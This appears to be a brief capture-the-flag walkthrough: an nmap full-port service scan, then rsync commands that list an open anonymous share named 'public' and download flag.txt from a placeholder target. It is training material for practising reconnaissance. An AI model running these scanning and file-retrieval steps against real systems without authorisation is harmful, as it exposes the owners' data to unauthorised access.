sudo nmap -sV -p- --min-rate=1000 \[Host IP]
[[rsync]] --list-only {target_IP}::
rsync --list-only {target_IP}::public
rsync {target_IP}::public/flag.txt flag.txt
cat flag.txt